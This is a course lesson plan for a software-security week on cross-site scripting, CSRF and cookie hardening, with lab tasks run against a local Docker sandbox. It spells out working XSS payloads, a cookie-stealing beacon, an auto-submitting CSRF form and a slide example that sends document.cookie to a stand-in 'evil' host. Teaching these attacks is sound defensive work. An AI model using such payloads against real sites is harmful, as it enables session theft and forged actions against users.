# Lesson Plan — Week 5: XSS & Client-Side Risks

| | |
|---|---|
| **Course** | Software Security (⬚ course code) |
| **Week / date** | 5 · ⬚ |
| **Contact time** | 300 min = 120 lecture + 180 laboratory |
| **Lab folder** | `labs/week05-xss-client-side` |
| **Slides** | `slides/week05.md` |
| **Standards** | OWASP 2025 **A05 Injection** · CWE-79 (XSS), CWE-352 (CSRF), CWE-1004 (cookie without HttpOnly) |
| **CLOs addressed** | **CLO2** exploit · **CLO3** remediate (course specification §6, Week 5 row: "2, 3"). The recurring *Audit the AI* / *EiPE* + *Prompt Problem* parts carry **CLO5**, and *Evidence & Integrity* carries **CLO6** (course-spec §4). |

---

## 1. Session objectives

By the end of this week a student can:

**Knowledge (K)**
- K1 — Distinguish reflected, stored and DOM-based XSS by *where* the untrusted data is injected and *when* it executes, and name which two `vulnerable_app.py` implements and at which routes.
- K2 — Explain how contextual output encoding (`markupsafe.escape`) stops `<script>` from executing, and why HTML-context encoding is not the same as JavaScript- or URL-context encoding.
- K3 — Explain how a strict Content-Security-Policy (`script-src 'self'`) defeats an *injected* inline script even when encoding is missing.
- K4 — State what `HttpOnly`, `SameSite` and `Secure` each protect against, and why CSRF works without any script injection at all.

**Skills (P)**
- P1 — Land a reflected XSS through `/hello`, then minimise the payload and score it by character count.
- P2 — Persist a stored XSS that runs for every visitor of `/comments`.
- P3 — Read the sandbox session cookie from injected JavaScript and display or exfiltrate it, showing that `HttpOnly` is missing.
- P4 — Build a third-party page that forces a state-changing POST to `/comments` with no token and no user interaction.
- P5 — Prove that `fixed_app.py` blocks Tasks 1–3, then show that the CSRF PoC *still* succeeds against it and explain why.

**Attitude (A)**
- A1 — Test only the provided `vulnerable_app.py` sandbox and their own Juice Shop container, under [ETHICS.md](../../ETHICS.md); all "session theft" steps target the sandbox cookie `session=abc123` only.
- A2 — Submit evidence that is identifiably their own work, and be able to reproduce it live on request.
- A3 — Treat AI-generated security code as something to be verified, not trusted.

## 2. Key ideas (the through-line)

Week 4's mistake, one interpreter along. Last week the untrusted data was parsed as code by a SQL
engine; this week it is parsed as code by the browser's HTML and JavaScript parser. The difference
that matters is *whose* machine executes it: injected script runs inside the site's own origin, so
the same-origin policy protects the attacker's code rather than the victim — which is why an XSS
can read the session cookie, rewrite the page and keylog the user. The bug therefore lives on the
**output** side, in how the application renders data, not in how it accepts or stores it, and the
fix is contextual encoding at the point of rendering. CSP is defence-in-depth on top of that, never
a substitute for it.

The week's sting is Task 5. Students harden the cookie and add a strict CSP, re-fire the XSS
payloads and watch them die — and then the CSRF proof-of-concept still posts a comment, because
`/comments` never checks the `session` cookie or a token before accepting the POST. Hardening a
cookie only changes whether the *browser attaches* it; it does nothing about a server that never
looks at it. That is the lesson: a control has to address the mechanism, not merely be adjacent
to it.

## 3. Prior knowledge and preparation

- **Students, before class:** Docker Desktop working (Week 1 *Lab 0*); skim last week's recap.
- **Instructor, before class:** pre-pull `python:3.12-slim` — and `bkimminich/juice-shop` too if the
  optional DOM-XSS target will be used, that is an additional pull. Check that nothing on the
  teaching machine is already bound to **8080**; `docker-compose.yml` publishes `8080:5000` and the
  Task 3 beacon hard-codes that port (see §8).
- **Prerequisite concept:** Week 4's data-vs-code framing; what an HTML tag and attribute boundary
  is; that the browser attaches cookies to requests automatically.

## 4. Lecture — 120 min

| Time | Block | Content | Method |
|---|---|---|---|
| 0:00–0:10 | Weekly quiz + recap | Weekly quiz `quizzes/weekly/week05.md` (5 MCQ + 1 short answer; lowest 1–2 dropped across the term); the deck's *Recap — Week 4* slide bridges from injection to the browser — "the interpreter today is the browser's HTML/JS parser"; today's agenda | Individual quiz, lowest 1–2 dropped |
| 0:10–0:55 | Core concept | Browser security model: same-origin policy, origin = scheme + host + port, cookies/DOM/storage scoped per origin. XSS as injection into the page — attacker JavaScript runs in the victim's browser *in the site's origin*, so it can do anything the user can. The three flavours by where the payload lives: reflected (in the request, echoed back), stored (saved server-side, served to others), DOM (client-side JS writes untrusted data to the DOM) | Lecture + the deck's opening demo on the projector: pop `alert(1)`, then show the same payload reaching the cookie |
| 0:55–1:05 | Break | | |
| 1:05–1:35 | Deep dive + real cases | The deck's example payloads — `<script>fetch('//evil/'+document.cookie)</script>`, `<img src=x onerror=alert(1)>`, `"><svg onload=alert(1)>` — and the point they exist to make: context matters (HTML body vs attribute vs JS vs URL), which is why `<img onerror>` survives a `<script>` filter and why `">` must break out of an attribute first. CSRF as session riding: the browser auto-sends cookies, so an attacker forges a state-changing request with no script on the page. Real case: British Airways 2018 — Magecart JavaScript skimming card details as users typed, frequently entering via a compromised third-party script. CWE mapping: CWE-79, CWE-352, CWE-1021 (clickjacking) | Lecture + short discussion: "which flavour is most dangerous, and why?" |
| 1:35–1:55 | Defences | Output encoding per context (HTML/attr/JS/URL); framework auto-escaping and the real danger — developers opting out with `innerHTML` / `dangerouslySetInnerHTML`; CSP as defence-in-depth (even if a payload lands, the browser refuses to run it); `HttpOnly` + `SameSite` cookies, anti-CSRF tokens, checking Origin/Referer | Lecture with before/after code diffs: `vulnerable_app.py` L19 (reflected concatenation), L30 (stored concatenation), L40 (bare `set_cookie`) against `fixed_app.py` L21 (`escape`), L30–33 (Jinja autoescape), L42 (hardened cookie) and L12 (CSP) |
| 1:55–2:00 | Brief the game | "XSS Golf" — shortest payload that pops `alert(1)`, leaderboard by character count; Round 2 = deploy a CSP + escaping that blocks *every* submitted payload; bonus: break a classmate's CSP | Instruction |

**Checks for understanding during lecture**
- After the three-flavours slide: cold-call *"which flavour is most dangerous, and why?"* (stored — it hits everyone who loads the page, not just whoever clicks the link).
- Before the break: one-minute paper — *"where is the XSS bug: in the input, or in the output?"*

## 5. Laboratory — 180 min

Target: `docker compose up` in `labs/week05-xss-client-side` → `http://localhost:8080`
(service name `xss-lab`, published as `8080:5000`; `vulnerable_app.py` runs by default,
`fixed_app.py` is the correct version). Optional secondary target for DOM XSS, which our app does
not expose: `docker run --rm -p 3000:3000 bkimminich/juice-shop` → `http://localhost:3000`.

Per task, students submit the exact **payload**, a **screenshot** of the alert or effect, and a
**2–3 sentence mitigation**.

| Time | Task | Student does | Evidence produced |
|---|---|---|---|
| 0:00–0:05 | **Task 0 — Onboarding** | Browse `http://localhost:8080/`; DevTools → Application → Cookies; confirm `session=abc123` is set with **no HttpOnly / SameSite** | Screenshot of the cookie |
| 0:05–0:35 | **Task 1 — Reflected XSS + XSS Golf** | Visit `/hello?name=<script>alert(1)</script>`, then the alternate `/hello?name=<img src=x onerror=alert(1)>` (useful when `<script>` tags specifically are filtered — note it is actually 3 characters longer, not shorter); record each payload's character count | Both payloads + char counts + screenshot of `alert(1)` + lowest golf score |
| 0:35–1:05 | **Task 2 — Stored XSS** | POST a comment with body `<script>alert(document.cookie)</script>` (use the form or `curl -d 'body=...'`); reload `/comments` and watch the cookie pop | Payload + screenshot of the alert showing `session=abc123` + why stored XSS is more dangerous than reflected |
| 1:05–1:30 | **Task 3 — Cookie theft via XSS** | Store `<script>new Image().src='http://localhost:8080/hello?name='+document.cookie</script>` (a beacon), or simply `<img src=x onerror=alert(document.cookie)>` | Payload + screenshot + 2–3 sentences on how HttpOnly would have stopped this |
| 1:30–2:00 | **Task 4 — CSRF PoC** | Create a local `csrf.html` with an auto-submitting form (`<body onload="document.forms[0].submit()">`) posting to `http://localhost:8080/comments`; open the file and confirm the comment appears on `/comments` | The HTML + screenshot of the forged comment + why `SameSite=Strict` blocks it |
| 2:00–2:30 | **Task 5 — Defend / fix it** | `Ctrl-C`, then `docker compose run --rm --service-ports xss-lab bash -c "pip install --no-cache-dir flask && python fixed_app.py"`; re-fire Tasks 1–3, then re-run the Task 4 PoC — it **still posts the forged comment** | Escaped `/hello` output + the CSP response header + the hardened cookie flags + the still-successful forgery, with 2–3 sentences on why cookie hardening alone doesn't close CSRF here |
| 2:30–2:50 | **AI-resilient tasks** | *Audit the AI* (critique an AI-written exploit or fix, quoting the exact bad line), *Explain-in-Plain-English*, *Prompt Problem* | Written answers (start in class, finish as homework) |
| 2:50–3:00 | **Micro-demo + submit** | 2–3 rotating students give a 2–3 min "show your exploit/fix"; everyone submits | Worksheet PDF → Classroom; code → GitHub; weekly quiz → Google Form |

Task rows 0–5 use the worksheet's own names and its own minute budgets, which total 150 min —
`AGENDA.md` records that Weeks 4–6 and 10–12 worksheets are currently lighter (145–150 min of
tasks) than the standardised 180-min block. The remaining 30 min is spent as `AGENDA.md`'s
20-minute AI-resilient block plus a merged 10-minute micro-demo-and-submit tail.

**Formative checkpoints.**
- Task 3's beacon hard-codes `http://localhost:8080`. Any student who worked around a port clash by
  republishing on a different host port has a beacon that silently goes nowhere and produces no
  evidence — have them either fix the URL or fall back to the `<img src=x onerror=alert(document.cookie)>`
  variant the worksheet offers.
- Students posting the beacon with `curl -d 'body=...'` will find the `+` in `'…name='+document.cookie`
  arrives as a space and the script is broken. `curl --data-urlencode`, or simply pasting into the
  form in the browser, preserves it. (Verified against the running container.)
- Task 5's CSP produces **no console violation**: escaping has already neutralised the payloads, so
  nothing is left for CSP to block. A student hunting for a red CSP error in the console will
  conclude the header is absent. Send them to DevTools → Network → Response Headers instead.
- Tasks 1–4 must be finished by 2:00 for Task 5 to fit. A student still stuck at that point should
  switch to Task 5 and come back — Task 5 carries 25 rubric points on its own, while Tasks 1–4
  share 40.

## 6. Assessment for this week

| Instrument | Evidence | Outcome | Weight |
|---|---|---|---|
| Worksheet 5, Parts 1–4 | Payloads, screenshots, `csrf.html`, cited fix lines, written answers | K1–K4, P1–P5, A2 | Part of the 30% worksheet component; internal rubric 20 (lecture questions) / 40 (exploitation, Tasks 1–4) / 25 (defence, Task 5) / 15 (reflection) = 100 |
| Weekly quiz | `quizzes/weekly/week05.md` — 5 MCQ + 1 short answer (timing: see §8) | K1–K4 | Part of the 10% quiz/participation component |
| Viva spot-check / micro-demo | Live reproduction and explanation | P1–P5, A2 | Pass/flag for follow-up |
| Per-student flag | ⬚ — the worksheet's flag line is conditional ("if this lab issues one"); Q6 of the weekly quiz asks for a `FLAG{…}` | A2 | Integrity control, not a mark |

Grading detail is in the worksheet's own rubric. Partial credit is available where a student
explains the mechanism correctly but could not land the exploit.

## 7. Materials

- Lab: `labs/week05-xss-client-side/` — `vulnerable_app.py`, `fixed_app.py`, `docker-compose.yml`, `worksheet.md`, `README.md`
- Slides: `slides/week05.md`
- Weekly quiz: `quizzes/weekly/week05.md`
- Optional secondary target for the DOM-XSS half of the signature game: `bkimminich/juice-shop`
- References: OWASP Cross-Site Scripting Prevention Cheat Sheet; OWASP Content Security Policy Cheat Sheet (links in the lab README)
- Submission channels: [SUBMISSION.md](../../SUBMISSION.md) · Rules of engagement: [ETHICS.md](../../ETHICS.md)

## 8. Risks and contingencies

| Risk | Mitigation |
|---|---|
| **Port 8080 already bound** — `docker-compose.yml` publishes `8080:5000`, and compose fails outright with `Bind for 0.0.0.0:8080 failed: port is already allocated`. (This happened on the authoring machine.) | Republish on a free host port (`-p 18080:5000`, or override the ports mapping); then remember Task 3's beacon and Task 4's `csrf.html` both hard-code `http://localhost:8080` and must be edited to match |
| **Juice Shop won't pull, or 3000 is taken** — it is an optional extra target, pulled from Docker Hub and binding port 3000 | Cost is bounded: the worksheet's XSS Golf tasks all run against the local `vulnerable_app.py`, so a failed Juice Shop pull costs only the DOM-XSS demonstration, which our app does not expose anyway |
| **Task 5 needs the network every time** — `docker compose run … "pip install --no-cache-dir flask && python fixed_app.py"` re-fetches the Flask wheel from PyPI on every invocation (`--rm` discards the container and `--no-cache-dir` forbids a pip cache, so nothing is reused between runs) | Pre-pull `python:3.12-slim`; if the room's network drops mid-lab, run Task 5 on the instructor machine on the projector and have students record the observed evidence |
| **`fixed_app.py` L42 sets `secure=True` but the lab is served over plain HTTP** on `http://localhost:8080` | Task 5's deliverable is a screenshot of the hardened cookie flags — have students confirm in DevTools → Application → Cookies what *their* browser actually did rather than assuming, since a browser that refuses to store a `Secure` cookie over HTTP shows no `session` cookie at all. The `Set-Cookie: session=abc123; Secure; HttpOnly; Path=/; SameSite=Strict` response header is present either way (Network → Response Headers) |
| **Task 5 looks like it failed** because the browser console shows no CSP violation | Expected: escaping already neutralises the payloads, so no script is left to block. The proof is the escaped `&lt;script&gt;` in the page source and the `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'` response header (`fixed_app.py` L12 — the worksheet cites its `script-src 'self'` directive) |
| **Q6 of `quizzes/weekly/week05.md` cannot be answered at 0:00–0:10** — it asks for the payload that scored in *this week's* XSS Golf and the student's own flag, which do not exist until the lab has run | Decide in advance and tell the class: either run the 5 MCQs at the start of the lecture and collect Q6 at the end of the lab block, or hold the whole quiz to the start of the next session. ⬚ instructor's choice — the repo does not settle this |
| **A student's `alert()` never fires but the payload looks right** | Check the raw response with `curl` first — `vulnerable_app.py` L19 concatenates unconditionally, so if the response body contains the raw tag the server side is fine and the problem is in the browser/extension environment. (Percent-encoding in the URL is *not* the cause: Flask decodes `request.args`, and `curl -G "http://localhost:8080/hello" --data-urlencode 'name=<script>alert(1)</script>'` still returns the raw tag — verified. The `-G` matters: without it curl POSTs the payload and `/hello`, a GET-only route, answers `405 METHOD NOT ALLOWED`) |
| **Copy-paste of a classmate's payload** — trivially easy in a golf game where short payloads converge | Golf scoring rewards convergent answers, so weight the *explanation* (which sink, which context, why that vector) over the string itself; identity-stamped screenshots and the viva spot-check attribute the work |

## 9. Post-teaching reflection

*Complete after the session — this also feeds the course's engagement data.*

- Attendance / completion: ⬚
- Time actually taken per task (vs. plan): ⬚
- Where the class got stuck, and what unblocked them: ⬚
- Misconception that showed up in the *Explain-in-Plain-English* answers: ⬚
- Quality of the *Audit the AI* critiques (did students catch the planted flaw?): ⬚
- Anything to change before this week runs again: ⬚
